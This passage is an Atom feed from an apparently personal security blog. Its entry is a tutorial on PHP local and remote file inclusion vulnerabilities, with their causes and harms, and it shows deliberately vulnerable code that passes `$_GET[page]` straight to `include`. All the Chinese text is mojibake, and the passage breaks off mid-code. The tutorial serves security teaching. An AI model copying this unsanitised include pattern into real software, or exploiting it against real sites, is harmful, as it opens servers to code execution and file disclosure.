<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Or0kit.github.io</id>
    <title>Or0kit â€¢ Posts by &#34;æ–‡ä»¶åŒ…å«&#34; tag</title>
    <link href="https://Or0kit.github.io" />
    <updated>2021-01-20T04:12:47.000Z</updated>
    <category term="Drozer" />
    <category term="Algolia" />
    <category term="åŒä¹‰è¯æ›¿æ¢" />
    <category term="xpath" />
    <category term="win32api" />
    <category term="WOW64" />
    <category term="windowsæ¶ˆæ¯æœºåˆ¶" />
    <category term="è™šæ‹Ÿå†…å­˜" />
    <category term="jsDelivr" />
    <category term="First blog" />
    <category term="markdown å­¦ä¹ " />
    <category term="Android" />
    <category term="æ›¿æ¢å¯†é’¥" />
    <category term="æ•°è®ºåŸºç¡€" />
    <category term="ADB" />
    <category term="é›·ç”µæ¨¡æ‹Ÿå™¨" />
    <category term="Hadoop" />
    <category term="IDA" />
    <category term="Windowsé€†å‘" />
    <category term="SSHéš§é“" />
    <category term="url" />
    <category term="http" />
    <category term="Nginx" />
    <category term="Linux" />
    <category term="CentOS7é…ç½®vsftp" />
    <category term="Psad" />
    <category term="fwsnort" />
    <category term="åº”æ€¥å“åº”" />
    <category term="x86æ±‡ç¼–æŒ‡ä»¤" />
    <category term="é€†å‘" />
    <category term="IDAå­¦ä¹ " />
    <category term="æ¶æ„ä»£ç åˆ†æå®æˆ˜å…¥é—¨" />
    <category term="é™æ€åˆ†æåŸºç¡€" />
    <category term="åŠ¨æ€åˆ†ææŠ€æœ¯åŸºç¡€" />
    <category term="åŠ å£³" />
    <category term="è„±å£³" />
    <category term="C++å£³" />
    <category term="ESPå¯»å€" />
    <category term="å®šä½Win32çª—å£å›è°ƒå‡½æ•°" />
    <category term="HOOKæ”»é˜²" />
    <category term="ç¬æ—¶HOOKè¿‡æ£€æµ‹" />
    <category term="INLINE-HOOK" />
    <category term="IAT HOOK" />
    <category term="INLINE HOOK" />
    <category term="è¿›ç¨‹ç›‘æ§" />
    <category term="æ¨¡å—éšè—" />
    <category term="è¿›ç¨‹é€šä¿¡" />
    <category term="tlhelp32.h" />
    <category term="è¿›ç¨‹éå†" />
    <category term="æ¨¡å—éå†" />
    <category term="TEB" />
    <category term="PEB" />
    <category term="R3å±‚æ–­é“¾" />
    <category term="å¤–æŒ‚åŸç†" />
    <category term="DLLæ³¨å…¥ä¹‹è¿›ç¨‹é—´é€šä¿¡" />
    <category term="Winä¸´ç•ŒåŒº" />
    <category term="Winäº’æ–¥ä½“" />
    <category term="å†…å­˜æ˜ å°„æ–‡ä»¶" />
    <category term="å†…å­˜æ˜ å°„å…±äº«" />
    <category term="å†™æ‹·è´" />
    <category term="Winäº‹ä»¶" />
    <category term="çº¿ç¨‹åŒæ­¥" />
    <category term="Winå­çª—å£æ§ä»¶" />
    <category term="win32æ–‡ä»¶å‡½æ•°" />
    <category term="ä»£ç æ³¨å…¥" />
    <category term="çª—å£ç¨‹åº" />
    <category term="æ¶ˆæ¯æœºåˆ¶" />
    <category term="æ¶ˆæ¯ç±»å‹" />
    <category term="ç§æœ‰å†…å­˜" />
    <category term="å…±äº«å†…å­˜" />
    <category term="è®¾å¤‡å¯¹è±¡" />
    <category term="DCè®¾å¤‡ä¸Šä¸‹æ–‡" />
    <category term="å›¾å½¢å¯¹è±¡" />
    <category term="åˆ›å»ºçº¿ç¨‹" />
    <category term="çº¿ç¨‹æ§åˆ¶" />
    <category term="çº¿ç¨‹ç›¸å…³API" />
    <category term="çº¿ç¨‹ä¸Šä¸‹æ–‡" />
    <category term="CONTEXTç»“æ„ä½“" />
    <category term="ç‰©ç†å†…å­˜" />
    <category term="Windowsè¿›ç¨‹" />
    <category term="å¥æŸ„è¡¨" />
    <category term="è¿œç¨‹çº¿ç¨‹å‡½æ•°" />
    <category term="è¿œç¨‹çº¿ç¨‹" />
    <category term="DLLæ³¨å…¥" />
    <category term="DLLæ³¨å…¥ç›¸å…³å‡½æ•°" />
    <category term="WinMainå‡½æ•°" />
    <category term="è°ƒç”¨çº¦å®š" />
    <category term="æˆ‘çš„GetProcAddress" />
    <category term="èµ„æºæ–‡ä»¶" />
    <category term="æ¶ˆæ¯æ–­ç‚¹" />
    <category term="é€šç”¨æ§ä»¶" />
    <category term="WM_NOTIFYæ¶ˆæ¯ç±»å‹" />
    <category term="MFC" />
    <category term="PEæŸ¥çœ‹å™¨" />
    <category term="PEè¯¾åä½œä¸š" />
    <category term="RVAä¸FOA" />
    <category term="PEç»“æ„" />
    <category term="DOSå¤´å±æ€§è¯´æ˜" />
    <category term="æ ‡å‡†PEå¤´å±æ€§è¯´æ˜" />
    <category term="æ‰©å±•PEå¤´å±æ€§è¯´æ˜" />
    <category term="èŠ‚è¡¨å±æ€§è¯´æ˜" />
    <category term="ç©ºç™½åŒºæ·»åŠ ä»£ç " />
    <category term="åˆå¹¶èŠ‚" />
    <category term="å¯¼å…¥è¡¨" />
    <category term="æ³¨å…¥" />
    <category term="å¯¼å…¥è¡¨æ³¨å…¥" />
    <category term="å¯¼å‡ºè¡¨" />
    <category term="æ–°å¢èŠ‚" />
    <category term="ç§»åŠ¨NTå¤´" />
    <category term="æ‰©å¤§èŠ‚" />
    <category term="ç§»åŠ¨å¯¼å‡ºè¡¨" />
    <category term="ç§»åŠ¨é‡å®šä½è¡¨" />
    <category term="é‡å®šä½è¡¨" />
    <category term="é™æ€é“¾æ¥åº“" />
    <category term="åŠ¨æ€é“¾æ¥åº“" />
    <category term="å¥æŸ„" />
    <category term="button" />
    <category term="å•é€‰æ¡†" />
    <category term="å¤é€‰æ¡†ä»¶" />
    <category term="Edit" />
    <category term="Combo Box" />
    <category term="Tab" />
    <category term="ListCtrl" />
    <category term="MFCçš„æœ¬è´¨" />
    <category term="MFCçš„å±‚æ¬¡ç»“æ„å›¾" />
    <category term="æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªMFCç¨‹åº" />
    <category term="MFCçš„åˆå§‹åŒ–è¿‡ç¨‹" />
    <category term="MFCè¿è¡Œæ—¶ç±»å‹è¯†åˆ«" />
    <category term="å…³é”®å­—static" />
    <category term="å…³é”®å­—const" />
    <category term="MFCåŠ¨æ€åˆ›å»º" />
    <category term="MFCæ¶ˆæ¯æ˜ å°„" />
    <category term="ç»“æ„ä½“AFX_MSGMAP_ENTRY" />
    <category term="ç»“æ„ä½“AFX_MSGM" />
    <category term="MFCçš„ä¸‰å¤§ç±»æ¶ˆæ¯" />
    <category term="æ•°æ®ä¼ è¾“" />
    <category term="iniæ–‡ä»¶çš„è¯»å†™" />
    <category term="python" />
    <category term="SSH" />
    <category term="pythonæ–‡ä»¶è¯»å–" />
    <category term="æ•°æ®åˆ†æ" />
    <category term="socket" />
    <category term="æ•°æ®åº“ç¼–ç¨‹" />
    <category term="pythonå†…ç½®å±æ€§" />
    <category term="multiprocessing" />
    <category term="threading" />
    <category term="scrapy" />
    <category term="æµ‹è¯•" />
    <category term="BHP" />
    <category term="Pythonçš„importåŠŸèƒ½" />
    <category term="æœ¨é©¬" />
    <category term="STL" />
    <category term="Vectorå®¹å™¨" />
    <category term="Dequeå®¹å™¨" />
    <category term="Listå®¹å™¨" />
    <category term="Setå®¹å™¨" />
    <category term="Multisetå®¹å™¨" />
    <category term="Mapå®¹å™¨" />
    <category term="Multimapå®¹å™¨" />
    <category term="Stackå®¹å™¨" />
    <category term="Queueå®¹å™¨" />
    <category term="STLç®—æ³•" />
    <category term="STLè¿­ä»£å™¨" />
    <category term="CobaltStrike" />
    <category term="RedTeam" />
    <category term="Apeache" />
    <category term="Nmap" />
    <category term="php" />
    <category term="guestbook" />
    <category term="SQLmap" />
    <category term="apache" />
    <category term="log" />
    <category term="mysqlä¸»é”®" />
    <category term="CSRF" />
    <category term="SSRF" />
    <category term="ä¸šåŠ¡é€»è¾‘æ¼æ´" />
    <category term="xss" />
    <category term="webshellæµé‡ç‰¹å¾" />
    <category term="è™šæ‹Ÿç½‘å¡" />
    <category term="0ç¯ä¸3ç¯çš„é€šä¿¡ï¼ˆå¸¸è§„æ–¹æ³•ï¼‰" />
    <category term="å†…æ ¸ç©ºé—´" />
    <category term="å†…æ ¸æ¨¡å—" />
    <category term="éå†å†…æ ¸æ¨¡å—" />
    <category term="å®šä½æœªå¯¼å‡ºå‡½æ•°PspTiminateProcess" />
    <category term="å†…æ ¸ç¼–ç¨‹åŸºç¡€" />
    <category term="ANSI_STRING" />
    <category term="UNICODE_STRING" />
    <category term="å†…æ ¸å†…å­˜" />
    <category term="ä¸Šä¸‹æ–‡ç¯å¢ƒ" />
    <category term="ä¸­æ–­è¯·æ±‚çº§åˆ«" />
    <category term="é“¾è¡¨" />
    <category term="è‡ªæ—‹é”" />
    <category term="æ³¨å†Œè¡¨" />
    <category term="åœ°å€ç©ºé—´" />
    <category term="æ–‡ä»¶æ“ä½œ" />
    <category term="çº¿ç¨‹ä¸äº‹ä»¶" />
    <category term="å†…æ ¸é‡è½½" />
    <category term="é©±åŠ¨è°ƒè¯•" />
    <category term="é…ç½®VS2019+WDK10" />
    <category term="ç¬¬ä¸€ä¸ªé©±åŠ¨ç¨‹åº" />
    <category term="è°ƒè¯•é©±åŠ¨ç¨‹åº" />
    <category term="OpenSCManager" />
    <category term="CreateService" />
    <category term="APCçš„æœ¬è´¨" />
    <category term="APCçš„å¤‡ç”¨é˜Ÿåˆ—" />
    <category term="æ¶ˆæ¯é˜Ÿåˆ—" />
    <category term="PsConvertToGuiThread" />
    <category term="win32k.sys" />
    <category term="GUIçº¿ç¨‹" />
    <category term="çª—å£ç¨‹åºçš„åˆ›å»º" />
    <category term="æ¶ˆæ¯å¾ªç¯" />
    <category term="çº¿æ€§åœ°å€çš„ç®¡ç†" />
    <category term="VADæ ‘" />
    <category term="_MMVAD" />
    <category term="_MMVAD_FLAGS" />
    <category term="VirtualAlloc" />
    <category term="MEM_COMMITä¸MEM_RESERVE" />
    <category term="malloc" />
    <category term="å †å†…å­˜" />
    <category term="æ ˆå†…å­˜" />
    <category term="å…¨å±€åŒºå†…å­˜" />
    <category term="å…±äº«ç‰©ç†é¡µ" />
    <category term="å…±äº«æ–‡ä»¶" />
    <category term="LoadLibraryçš„æœ¬è´¨" />
    <category term="MmAddPhysicalMemoryEx" />
    <category term="ç¼ºé¡µå¼‚å¸¸" />
    <category term="ä¸´ç•ŒåŒº" />
    <category term="KPCRç»“æ„ä½“" />
    <category term="ç­‰å¾…é“¾è¡¨" />
    <category term="è°ƒåº¦é“¾è¡¨" />
    <category term="æ¨¡æ‹Ÿçº¿ç¨‹åˆ‡æ¢" />
    <category term="æ¨¡æ‹ŸæŒ‚èµ·ä¸æ¢å¤å‡½æ•°" />
    <category term="è¿›ç¨‹çš„åˆ›å»º" />
    <category term="è·å–å½“å‰è¿›ç¨‹" />
    <category term="ETHREAD" />
    <category term="KTHREAD" />
    <category term="EPROCESS" />
    <category term="KPROCESS" />
    <category term="2-9-9-12åˆ†é¡µ" />
    <category term="PAE" />
    <category term="PDPTE" />
    <category term="PDE" />
    <category term="PTE" />
    <category term="XDæ ‡å¿—ä½" />
    <category term="é€†å‘åˆ†æMmIsAddressValidå‡½æ•°(2-9-9-12)" />
    <category term="PWT" />
    <category term="PDT" />
    <category term="TLB" />
    <category term="CPUç¼“å­˜" />
    <category term="INVLPGæŒ‡ä»¤" />
    <category term="å…¨å±€é¡µ" />
    <category term="ShadowWalker" />
    <category term="ä¸­æ–­" />
    <category term="å¼‚å¸¸" />
    <category term="CLIæŒ‡ä»¤" />
    <category term="STIæŒ‡ä»¤" />
    <category term="INT2" />
    <category term="INT8" />
    <category term="ä¸­æ–­é—¨æè¿°ç¬¦" />
    <category term="IDT" />
    <category term="ææƒ" />
    <category term="TSS" />
    <category term="è·¨æ®µè·³è½¬æµç¨‹" />
    <category term="JMP FARæŒ‡ä»¤" />
    <category term="ä»»åŠ¡é—¨" />
    <category term="LDTæ®µæè¿°ç¬¦" />
    <category term="LDT" />
    <category term="CR0" />
    <category term="CR2" />
    <category term="CR4" />
    <category term="CRL" />
    <category term="DPL" />
    <category term="RPL" />
    <category term="æ®µå¯„å­˜å™¨ç»“æ„" />
    <category term="æ®µæè¿°ç¬¦" />
    <category term="æ®µé€‰æ‹©å­" />
    <category term="GDTè¡¨" />
    <category term="è°ƒç”¨é—¨" />
    <category term="è°ƒç”¨é—¨æè¿°ç¬¦" />
    <category term="é€†å‘åˆ†æMmIsAddressValidå‡½æ•°" />
    <category term="error C2143" />
    <category term="error C2275" />
    <category term="CALLä¸CALL FAR" />
    <category term="é™·é˜±é—¨æè¿°ç¬¦" />
    <category term="é¡µç›®å½•è¡¨åŸºå€" />
    <category term="é¡µè¡¨çš„åŸºå€" />
    <category term="0åœ°å€æ‰§è¡ŒShellCode" />
    <category term="10-10-12åˆ†é¡µ" />
    <category term="PDE_PTE" />
    <category term="ç‰©ç†é¡µ" />
    <category term="SSDT HOOK" />
    <category term="OpenProcess" />
    <category term="ç³»ç»ŸæœåŠ¡è¡¨" />
    <category term="SSDT" />
    <category term="SSDT HOOKéšè—" />
    <category term="APIè¿›å‡ºå†…æ ¸" />
    <category term="ç³»ç»Ÿè°ƒç”¨é˜¶æ®µæ€»ç»“" />
    <category term="ç½‘ç»œå®‰å…¨æ³•" />
    <category term="ASCII" />
    <category term="GBK" />
    <category term="ANSI" />
    <category term="Unicode" />
    <category term="UTF-8" />
    <category term="URL ç¼–ç /è§£ç " />
    <category term="åè¿›åˆ¶" />
    <category term="äºŒè¿›åˆ¶" />
    <category term="åå…­è¿›åˆ¶" />
    <category term="å†…å­˜" />
    <category term="ç¼–å†™ShellCodeå®ç°IAT HOOK" />
    <category term="ShellCodeåŸåˆ™" />
    <category term="å‚€å„¡è¿›ç¨‹åŠ å¯†å£³" />
    <category term="ZwUnmapViewOfSectionå‡½æ•°" />
    <category term="åŠ è½½å›¾æ ‡" />
    <category term="æå–å›¾æ ‡" />
    <category term="èµ„æºè¡¨" />
    <category term="MFCå‘½ä»¤ä¼ é€’" />
    <category term="è¿œæ§ç•Œé¢ç¼–å†™" />
    <category term="HTML" />
    <category term="æ–‡ä»¶åŒ…å«" />
    <category term="sqlæ³¨å…¥" />
    <category term="ç»å…¸å®šé•¿æŒ‡ä»¤" />
    <category term="ç»å…¸å˜é•¿æŒ‡ä»¤" />
    <category term="æŒ‡ä»¤å‰ç¼€" />
    <category term="è¿›ç¨‹å¥æŸ„è¡¨" />
    <category term="å…¨å±€å¥æŸ„è¡¨" />
    <category term="KAPC" />
    <category term="QueueUserAPC" />
    <category term="NtQueueApcThread" />
    <category term="KeInitializeApc" />
    <category term="KeInsertQueueApc" />
    <category term="KiInsertQueueApc" />
    <category term="æ¶ˆæ¯é˜Ÿåˆ—ä¸çº¿ç¨‹" />
    <category term="Windowsçº¿ç¨‹åˆ‡æ¢" />
    <category term="KiSwapContext" />
    <category term="SwapContext" />
    <category term="æ—¶é’Ÿä¸­æ–­" />
    <category term="æ—¶é—´ç‰‡ç®¡ç†" />
    <category term="çº¿ç¨‹åˆ‡æ¢ä¸TSS" />
    <category term="çº¿ç¨‹åˆ‡æ¢ä¸FS" />
    <category term="çº¿ç¨‹åˆ‡æ¢ä¸çº¿ç¨‹ä¼˜å…ˆçº§" />
    <category term="å¿«é€Ÿè°ƒç”¨" />
    <category term="ä¸­æ–­è°ƒç”¨" />
    <category term="åˆ†æReadProcessMemory" />
    <category term="KiFastSystemCall" />
    <category term="KiIntSystemCall" />
    <category term="é‡å†™3ç¯" />
    <category term="æ–‡ä»¶ä¸Šä¼ " />
    <category term="éšè—é©±åŠ¨" />
    <category term="IopLoadDriver" />
    <category term="å»¶è¿Ÿè¿‡ç¨‹è°ƒç”¨" />
    <category term="è¿›ç¨‹æŒ‚é " />
    <category term="è·¨è¿›ç¨‹è¯»å†™å†…å­˜" />
    <category term="APC" />
    <category term="é€†å‘åˆ†æNtReadVirtualMemory" />
    <category term="é€†å‘åˆ†æNtWriteVIrtualMemory" />
    <category term="AD-Attack-Defense" />
    <category term="payload" />
    <category term="sysenteræŒ‡ä»¤" />
    <category term="KiFastCallEntryå‡½æ•°" />
    <category term="KiSystemServiceå‡½æ•°" />
    <category term="Trap_Frame" />
    <category term="webå®‰å…¨" />
    <category term="Pentest" />
    <entry>
        <id>https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
        <title>webæ¼æ´-æ–‡ä»¶åŒ…å«</title>
        <link rel="alternate" href="https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
        <content type="html">&lt;h1 id=&#34;æ–‡ä»¶åŒ…å«æ¼æ´ç®€ä»‹&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æ–‡ä»¶åŒ…å«æ¼æ´ç®€ä»‹&#34;&gt;#&lt;/a&gt; æ–‡ä»¶åŒ…å«æ¼æ´ç®€ä»‹&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Ÿ&lt;br /&gt;
ç¨‹åºå¼€å‘äººå‘˜é€šå¸¸ä¼šæŠŠå¯é‡å¤ä½¿ç”¨çš„å‡½æ•°å†™åˆ°å•ä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ä½¿ç”¨æŸäº›å‡½æ•°æ—¶ï¼Œç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶ï¼Œæ— éœ€å†æ¬¡ç¼–å†™ï¼Œè¿™ç§è°ƒç”¨æ–‡ä»¶çš„è¿‡ç¨‹ä¸€èˆ¬è¢«ç§°ä¸ºæ–‡ä»¶åŒ…å«ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ–‡ä»¶åŒ…å«æ¼æ´çš„æˆå› &lt;br /&gt;
éšç€ç½‘ç«™ä¸šåŠ¡çš„éœ€æ±‚ï¼Œç¨‹åºå¼€å‘äººå‘˜ä¸€èˆ¬å¸Œæœ›ä»£ç æ›´çµæ´»ï¼Œæ‰€ä»¥å°†è¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸º&lt;ins class=&#34;primary&#34;&gt;å˜é‡&lt;/ins&gt;ï¼Œç”¨æ¥è¿›è¡ŒåŠ¨æ€è°ƒç”¨ï¼Œç”¨æˆ·å¯ä»¥å¯¹&lt;ins class=&#34;primary&#34;&gt;å˜é‡çš„å€¼å¯æ§&lt;/ins&gt;è€ŒæœåŠ¡å™¨ç«¯æœªå¯¹å˜é‡å€¼è¿›è¡Œåˆç†åœ°æ ¡éªŒæˆ–è€…æ ¡éªŒè¢«ç»•è¿‡ï¼Œè¿™æ ·å°±å¯¼è‡´äº†æ–‡ä»¶åŒ…å«æ¼æ´ã€‚é€šå¸¸æ–‡ä»¶åŒ…å«æ¼æ´å‡ºç°åœ¨ PHP è¯­è¨€ä¸­ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;php ä¸­å¸¸è§åŒ…å«æ–‡ä»¶çš„å‡½æ•°
&lt;ul&gt;
&lt;li&gt;include () å½“ä½¿ç”¨è¯¥å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªæœ‰ä»£ç æ‰§è¡Œåˆ° include () å‡½æ•°æ—¶æ‰å°†æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶ä¹‹ç»™å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç»§ç»­&lt;ins class=&#34;primary&#34;&gt;å‘ä¸‹æ‰§è¡Œ&lt;/ins&gt;ã€‚&lt;/li&gt;
&lt;li&gt;include_once () åŠŸèƒ½ä¸ Include () ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œ&lt;ins class=&#34;primary&#34;&gt;ç¨‹åºåªè°ƒç”¨ä¸€æ¬¡&lt;/ins&gt;&lt;/li&gt;
&lt;li&gt;require () require () ä¸ include () çš„åŒºåˆ«åœ¨äº require () æ‰§è¡Œå¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œå‡½æ•°ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶&lt;ins class=&#34;primary&#34;&gt;ç»ˆæ­¢è„šæœ¬çš„è¿è¡Œ&lt;/ins&gt;ã€‚&lt;/li&gt;
&lt;li&gt;require_once () åŠŸèƒ½ä¸ require () ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œ&lt;ins class=&#34;primary&#34;&gt;ç¨‹åºåªè°ƒç”¨ä¸€æ¬¡&lt;/ins&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ†ç±»&lt;/p&gt;
&lt;p&gt;æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥åˆ†ä¸º RFI (è¿œç¨‹æ–‡ä»¶åŒ…å«) å’Œ LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼‰ä¸¤ç§ã€‚è€ŒåŒºåˆ†ä»–ä»¬æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯ php.ini ä¸­æ˜¯å¦å¼€å¯äº† allow_url_includeã€‚å¦‚æœå¼€å¯ äº†æˆ‘ä»¬å°±æœ‰å¯èƒ½åŒ…å«è¿œç¨‹æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;1ã€æœ¬åœ°æ–‡ä»¶åŒ…å« LFI (Local File Include)&lt;/p&gt;
&lt;p&gt;2ã€è¿œç¨‹æ–‡ä»¶åŒ…å« RFI (Remote File Include)ï¼ˆéœ€è¦ php.ini ä¸­ allow_url_include=onã€allow_url_fopen = Onï¼‰&lt;/p&gt;
&lt;p&gt;åœ¨ php.ini ä¸­ï¼Œallow_url_fopen é»˜è®¤ä¸€ç›´æ˜¯ Onï¼Œè€Œ allow_url_include ä» php5.2 ä¹‹åå°±é»˜è®¤ä¸º Offã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ–‡ä»¶åŒ…å«æ¼æ´çš„å±å®³&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é…åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ GetShell&lt;/li&gt;
&lt;li&gt;å¯ä»¥æ‰§è¡Œä»»æ„è„šæœ¬ä»£ç &lt;/li&gt;
&lt;li&gt;ç½‘ç«™æºç æ–‡ä»¶ä»¥åŠé…ç½®æ–‡ä»¶æ³„éœ²&lt;/li&gt;
&lt;li&gt;è¿œç¨‹åŒ…å« GetShell&lt;/li&gt;
&lt;li&gt;æ§åˆ¶æ•´ä¸ªç½‘ç«™ç”šè‡³æ˜¯æœåŠ¡å™¨&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;å¸¸è§æ¼æ´ç¯å¢ƒ&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#å¸¸è§æ¼æ´ç¯å¢ƒ&#34;&gt;#&lt;/a&gt; å¸¸è§æ¼æ´ç¯å¢ƒ&lt;/h1&gt;
&lt;p&gt;äº†è§£è¿™äº›ä¸»è¦æ˜¯ä¸ºäº†ç»•è¿‡&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;span&gt;ç¤ºä¾‹&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;show.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;./action/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token 